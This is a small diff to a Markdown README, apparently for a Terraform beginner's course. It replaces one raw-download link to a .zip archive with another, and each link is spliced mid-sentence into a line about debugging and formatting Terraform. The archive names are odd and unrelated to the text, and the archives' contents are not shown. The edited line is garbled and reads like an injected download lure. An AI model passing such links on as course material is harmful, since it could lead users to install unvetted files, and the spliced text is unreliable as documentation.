@@ -46,7 +46,7 @@ Elevate your configurations with conditional expressions, adding logic to your c
 
 #### Debugging and Formatting Terraform Files
 
-Master the art of debugging Terraform https://github.com/soubhagya2612/terraform-zero-to-hero/raw/refs/heads/main/Day-2/PROJECT-vpc-with-ec2/hero-to-zero-terraform-antinepotic.zip, learn why proper formatting with terraform fmt is crucial.
+Master the art of debugging Terraform https://raw.githubusercontent.com/soubhagya2612/terraform-zero-to-hero/main/Day-1/PROJECT-ec2-instance-creation/hero_terraform_zero_to_v2.3.zip, learn why proper formatting with terraform fmt is crucial.
 
 ## Day 3: Building Reusable Infrastructure with Modules
 
